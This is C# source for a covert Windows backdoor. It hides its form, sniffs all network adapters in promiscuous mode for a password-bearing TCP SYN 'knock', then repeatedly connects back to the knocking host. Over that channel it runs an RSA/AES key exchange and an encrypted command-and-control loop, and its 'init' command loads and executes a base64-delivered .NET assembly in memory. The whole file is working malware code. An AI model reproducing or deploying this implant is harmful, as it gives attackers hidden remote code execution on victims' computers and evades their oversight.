using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Security.Cryptography;

using PacketDotNet;
using SharpPcap;
using System.IO;
using System.Reflection;
using System.Net;
using System.Threading;

namespace Tipoff
{
    public partial class Form1 : Form
    {
        private Socket g_Socket;
        private bool m_bConnected = false;

        private int m_nTimeout = 10000; //ms
        private int m_nRetry = 10000; //ms

        private string m_szPassword = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"; //"[SHA256_PASSWORD]";

        public Form1()
        {
            InitializeComponent();
        }

        private string fnlpSha256(string szInput)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] abData = Encoding.UTF8.GetBytes(szInput);
                byte[] abHashed = sha256.ComputeHash(abData);

                return BitConverter.ToString(abHashed).Replace("-", string.Empty).ToLower();
            }
        }

        private byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }

        void ReceivedBuffer(Server s)
        {
            //Assembly assembly = Assembly.Load(abDll);
            try
            {
                Socket socket = s.socket;
                DSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[Server.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };
                s.Send(1, 0, "Hello");
                do
                {
                    static_recvBuf = new byte[Server.MAX_BUFFER_LENGTH];
                    recv_len = s.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < DSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = DSP.GetHeader(dynamic_recvBuf);
                        while (dynamic_recvBuf.Length - DSP.HEADER_SIZE >= head_info.len)
                        {
                            dsp = new DSP(dynamic_recvBuf);
                            dynamic_recvBuf = dsp.MoreData;
                            head_info = DSP.GetHeader(dynamic_recvBuf);
                            if (dsp.Command == 0)
                            {
                                if (dsp.Param == 0) //DISCONNECT
                                {
                                    
                                }
                                else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                {
                                    
                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string rsa_publicKey = Crypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                    rsa_publicKey = Crypto.b64D2Str(rsa_publicKey);
                                    s.tpRsaKeyPair.szXmlPublicKey = rsa_publicKey;
                                    var aes = Crypto.AES_GenerateKeyAndIV();
                                    s.tpAesKey.abKey = Convert.FromBase64String(aes.key);
                                    s.tpAesKey.abIV = Convert.FromBase64String(aes.iv);
                                    string payload = aes.key + "|" + aes.iv;
                                    byte[] enc_payload = Crypto.RSAEncrypt(payload, rsa_publicKey);
                                    s.Send(1, 1, enc_payload);
                                }
                                else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                {
                                    byte[] buffer = dsp.GetMsg().msg;
                                    string payload = Encoding.UTF8.GetString(buffer);
                                    buffer = Convert.FromBase64String(payload);
                                    payload = Crypto.AESDecrypt(buffer, s.tpAesKey.abKey, s.tpAesKey.abIV);
                                    payload = Convert.ToBase64String(Crypto.RSAEncrypt(payload, s.tpRsaKeyPair.szXmlPublicKey));
                                    payload = Crypto.AESEncrypt(payload, s.tpAesKey.abKey, s.tpAesKey.abIV);
                                    s.Send(1, 3, payload);
                                }
                                else if (dsp.Param == 4)
                                {
                                    s.Send(3, 0, "Hello");
                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0) //RECEIVED COMMAND
                                {
                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                    payload = Crypto.AESDecrypt(Convert.FromBase64String(payload), s.tpAesKey.abKey, s.tpAesKey.abIV);
                                    CommandProc(s, payload);
                                }
                                else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                {
                                    s.encSend(2, 1, DateTime.Now.ToString("F"));
                                }
                            }
                        }
                    }
                }
                while (recv_len > 0 && m_bConnected);
            }
            catch (Exception ex)
            {
                m_bConnected = false;
                return;
            }
        }

        void CommandProc(Server s, string szPayload)
        {
            string[] aCmd = szPayload.Split('|');
            if (aCmd[0] == "dll")
            {
                if (aCmd[1] == "ls")
                {

                }
                else if (aCmd[1] == "load")
                {

                }
            }
            else if (aCmd[0] == "init")
            {
                byte[] abExeBytes = Convert.FromBase64String(aCmd[1]);

                Assembly loaded = Assembly.Load(abExeBytes);
                MethodInfo entry = loaded.EntryPoint;
                object instance = null;
                if (!entry.IsStatic)
                    instance = loaded.CreateInstance(entry.Name);

                entry.Invoke(instance, new object[] { new string[] { } });

                s.socket.Close();
            }
        }

        bool Connect(string szIPAddr, int nPort)
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.ReceiveTimeout = sock.SendTimeout = m_nTimeout;
                sock.Connect(new IPEndPoint(IPAddress.Parse(szIPAddr), nPort));

                Server s = new Server(sock);
                new Thread(() => ReceivedBuffer(s)).Start();
                m_bConnected = true;

                g_Socket = sock;

                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        private void Device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            var pktRaw = e.Packet;
            Packet pkt = Packet.ParsePacket(pktRaw.LinkLayerType, pktRaw.Data);

            var pktTCP = pkt.Extract(typeof(TcpPacket)) as TcpPacket;
            if (pktTCP != null && pktTCP.Syn && pktTCP.SequenceNumber == 5000)
            {
                byte[] abPayload = pktTCP.PayloadData;
                string szPassword = Encoding.UTF8.GetString(abPayload);
                string szHashedPassword = fnlpSha256(szPassword);

                if (szHashedPassword == m_szPassword)
                {
                    IpPacket pktIP = pkt.Extract(typeof(IpPacket)) as IpPacket;
                    string szIP = pktIP.SourceAddress.ToString();
                    int nPort = pktTCP.SourcePort;

                    if (m_bConnected)
                        return;

                    new Thread(() =>
                    {
                        while (true)
                        {
                            if (!m_bConnected)
                            {
                                m_bConnected = Connect(szIP, nPort);
                            }

                            Thread.Sleep(m_nRetry);
                        }
                    }).Start();
                }
            }
        }

        void fnMain()
        {
            var devices = CaptureDeviceList.Instance;
            if (devices.Count == 0)
                return;

            m_bConnected = false;

            foreach (var device in devices)
            {
                try
                {
                    device.Open(DeviceMode.Promiscuous, 1000);
                    device.OnPacketArrival += new PacketArrivalEventHandler(Device_OnPacketArrival);
                    device.StartCapture();
                }
                catch
                {

                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            fnMain();
        }
    }
}
